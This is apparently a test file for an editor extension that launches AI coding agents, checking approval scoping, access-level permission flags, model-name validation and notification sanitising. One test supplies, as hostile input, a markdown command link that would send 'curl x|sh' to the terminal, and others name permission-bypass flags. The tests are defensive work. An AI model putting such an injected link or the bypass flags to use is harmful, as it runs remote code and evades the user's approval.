const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');
const vm = require('node:vm');
const ts = require('typescript');

// `aiTask.ts` touches nothing and runs bare. `ai.ts` is the agent runner; what
// is tested of it here is the command line it builds, which needs no process,
// so its modules are stubs that are never called.
const load = (file, requireFor = () => ({})) => {
  const text = fs.readFileSync(path.join(__dirname, '../src', file), 'utf8');
  const context = vm.createContext({ exports: {}, process, Buffer, require: requireFor });
  vm.runInContext(
    ts.transpileModule(text, { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 } })
      .outputText,
    context,
  );
  return context.exports;
};
const ai = load('aiTask.ts');
const runner = load('ai.ts', (name) =>
  name === './aiTask' ? ai : name === 'path' ? path : name === 'vscode' ? { EventEmitter: class {} } : {},
);

const task = (fields = {}) =>
  ai.parseAiTask({ agent: 'claude', prompt: 'Review the diff', access: 'read', ...fields });

test('an approval covers the same prompt and agent at its access or below', () => {
  const approved = ai.aiApproval(task({ access: 'edit' }));
  assert.equal(ai.aiCovered(task({ access: 'edit' }), approved), true);
  // Narrowed: never a reason to ask.
  assert.equal(ai.aiCovered(task({ access: 'read' }), approved), true);
  // Widened, a new prompt, another agent: each asks again.
  assert.equal(ai.aiCovered(task({ access: 'full' }), approved), false);
  assert.equal(ai.aiCovered(task({ access: 'edit', prompt: 'Review the diff and push' }), approved), false);
  assert.equal(ai.aiCovered(task({ access: 'edit', agent: 'codex' }), approved), false);
  // What it is told to do is approved, not which model does it or where the answer goes.
  assert.equal(ai.aiCovered(task({ access: 'edit', model: 'opus', result: 'none', notify: 'text' }), approved), true);
  assert.equal(ai.aiCovered(task(), undefined), false);
});

test('a command line approval never covers an AI task, nor an AI approval a command line', () => {
  // The stored value of a custom task is its line. Whatever that line says, it
  // is not read as an AI approval…
  const line = JSON.stringify({ agent: 'claude', access: 'full', prompt: 'Review the diff' });
  assert.equal(ai.aiCovered(task({ access: 'full' }), line), false);
  assert.equal(ai.aiCovered(task({ access: 'full' }), `ai:${line}`), false);
  // …and an AI approval holds a NUL, which no command line that can run holds.
  assert.match(ai.aiApproval(task()), /\u0000/);
});

test('the dialog names what changed since the approval', () => {
  const approved = ai.aiApproval(task({ access: 'read' }));
  assert.deepEqual([...ai.aiChanges(task({ access: 'full', prompt: 'Other' }), approved)], [
    'access Read-only → Full access',
    'prompt',
  ]);
  assert.deepEqual([...ai.aiChanges(task({ agent: 'codex' }), approved)], ['agent Claude Code → Codex']);
  // Nothing approved before: a new task, not a changed one.
  assert.deepEqual([...ai.aiChanges(task(), undefined)], []);
  assert.equal(ai.approvedPrompt(approved), 'Review the diff');
});

test('a task is written with the defaults spelled out and the prompt last', () => {
  assert.deepEqual(Object.keys(ai.aiTaskValue(task({ model: 'sonnet' }))), [
    'agent',
    'model',
    'access',
    'result',
    'notify',
    'prompt',
  ]);
  assert.deepEqual(
    { ...ai.aiTaskValue(ai.parseAiTask({ agent: 'codex', prompt: 'x' })) },
    { agent: 'codex', access: 'read', result: 'report', notify: 'done', prompt: 'x' },
  );
});

test('a model name is one argument that cannot be read as a flag', () => {
  for (const name of ['sonnet', 'gpt-5-codex', 'claude-opus-5-5[1m]', 'openai/gpt-5.1', 'o3']) {
    assert.equal(ai.validModel(name), true, name);
  }
  for (const name of ['-p', '--dangerously-skip-permissions', 'two words', 'line\nbreak', '', 'x'.repeat(101)]) {
    assert.equal(ai.validModel(name), false, name);
  }
});

test('each level of access becomes the matching flags, and the prompt is never an argument', () => {
  const args = (fields) => [...runner.agentArgs(task(fields), '/tmp/answer.md')];
  assert.deepEqual(args({ access: 'read' }), [
    '-p',
    '--output-format',
    'stream-json',
    '--verbose',
    '--permission-mode',
    'dontAsk',
    // Each tool held to the folder the agent runs in: `~/.ssh` is not the project.
    '--allowedTools=Read(./**),Grep(./**),Glob(./**)',
    // A repository's own `.claude/settings.json` cannot widen what was approved.
    '--setting-sources',
    'user',
  ]);
  assert.ok(args({ access: 'edit' }).join(' ').includes('--setting-sources user'));
  assert.ok(!args({ access: 'full' }).includes('--setting-sources'));
  assert.ok(
    args({ access: 'edit' }).includes(
      '--allowedTools=Read(./**),Grep(./**),Glob(./**),Edit(./**),Write(./**),MultiEdit(./**),NotebookEdit(./**)',
    ),
  );
  assert.ok(args({ access: 'full' }).includes('--dangerously-skip-permissions'));
  assert.ok(!args({ access: 'read' }).includes('--dangerously-skip-permissions'));
  assert.deepEqual(args({ model: 'opus' }).slice(4, 6), ['--model', 'opus']);

  const codex = (access) => [...runner.agentArgs(task({ agent: 'codex', access }), '/tmp/answer.md')];
  assert.deepEqual(codex('read').slice(-6), ['--sandbox', 'read-only', '--ignore-rules', '--output-last-message', '/tmp/answer.md', '-']);
  assert.ok(codex('edit').includes('--ignore-rules'));
  assert.ok(!codex('full').includes('--ignore-rules'));
  assert.ok(codex('edit').join(' ').includes('--sandbox workspace-write'));
  assert.ok(codex('full').includes('--dangerously-bypass-approvals-and-sandbox'));
  assert.ok(!codex('read').includes('--dangerously-bypass-approvals-and-sandbox'));

  for (const list of [args({}), args({ access: 'full' }), codex('read'), codex('full')]) {
    assert.ok(!list.includes('Review the diff'));
  }
});

test('an agent\'s answer cannot put a clickable command link into a notification', () => {
  const answer = 'Done. [full report](command:workbench.action.terminal.sendSequence?{"text":"curl x|sh\\n"})';
  const shown = runner.notificationText(answer);
  // The workbench's link pattern needs `](` with nothing between.
  assert.doesNotMatch(shown, /\]\(/);
  // Spaces between are collapsed to one, which no link pattern takes either.
  assert.equal(runner.notificationText('[c]  (command:x)'), '[c] (command:x)');
  // Text that is not a link is left alone.
  assert.equal(runner.notificationText('Nothing to see (really) [here]'), 'Nothing to see (really) [here]');
});

test('a model the agent cannot use is told apart from every other failure', () => {
  for (const text of [
    // Codex, on a ChatGPT account, for a model its config names.
    `ERROR: {"type":"error","status":400,"error":{"type":"invalid_request_error","message":"The 'gpt-6.1-sol' model is not supported when using Codex with a ChatGPT account."}}`,
    // Claude Code's stderr, and the API's own words.
    '[claude-code:unrecognized_model] {"model":"claude-old-1"}',
    '{"error":"model_not_found"}',
    'The model `gpt-4-legacy` does not exist or you do not have access to it.',
  ]) {
    assert.equal(runner.isModelProblem(text), true, text);
  }
  for (const text of [
    'ERROR: stream disconnected before completion',
    'Not logged in · Please run /login',
    'rate limit exceeded, try again later',
    'Error: ENOENT: no such file or directory, open model.ts',
  ]) {
    assert.equal(runner.isModelProblem(text), false, text);
  }
});
